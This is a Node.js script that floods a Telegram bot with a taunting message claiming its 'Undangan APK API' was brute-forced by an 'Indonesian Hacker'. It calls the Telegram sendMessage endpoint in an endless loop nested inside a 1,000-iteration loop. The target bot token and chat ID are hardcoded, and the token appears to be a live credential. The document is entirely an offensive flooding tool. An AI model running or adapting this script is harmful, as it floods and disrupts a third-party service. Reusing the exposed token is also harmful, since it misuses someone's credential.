const {default: axios} = require("axios")

const baseUrl = "https://api.telegram.org/";
const authToken = "bot6861974788:AAH_AbVplVpEG3XTRhVIgbMVqIeT-_y7vPQ"; //input this variable
const method = "sendMessage";
const paramMode = "markdown";
const paramChatId = "6951548817"; //input this variable
const paramText = "Your Undangan APK API has been brute-forced by ™ Indonesian Hacker!!!";
const url = `${baseUrl}${authToken}/${method}?parse_mode=${paramMode}&chat_id=${paramChatId}&text=${paramText}`;

async function sendMessage() {
    try {
        while (true) {
            await axios.get(url)
                .then((response) => {
                    if (response.status == 200) {
                        console.log(response.data)
                    }
                })
        }
    } catch (error) {
        console.log("API down!")
    }
}

async function sendMessageLoop(){
    const numberOfMessage = 1000;

    for(let i=0; i < numberOfMessage; i++){
        await sendMessage();
    }
}

sendMessageLoop(); // start sending message